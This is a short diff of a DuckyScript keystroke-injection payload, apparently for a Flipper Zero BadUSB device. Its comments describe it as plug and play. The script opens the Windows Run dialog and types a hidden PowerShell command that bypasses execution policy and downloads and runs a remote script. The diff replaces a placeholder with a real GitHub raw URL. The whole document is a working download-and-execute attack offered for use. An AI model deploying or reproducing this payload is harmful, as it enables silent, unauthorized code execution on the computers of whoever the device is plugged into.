@@ -6,5 +6,5 @@ REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CO
 REM     --------------------------------------------------------------------------------------
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm https://githublinkhere  | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/T-McBride/Flipper/main/usb_kb/Hopewell/Win_YTSubscribe.ps1 | iex
 ENTER
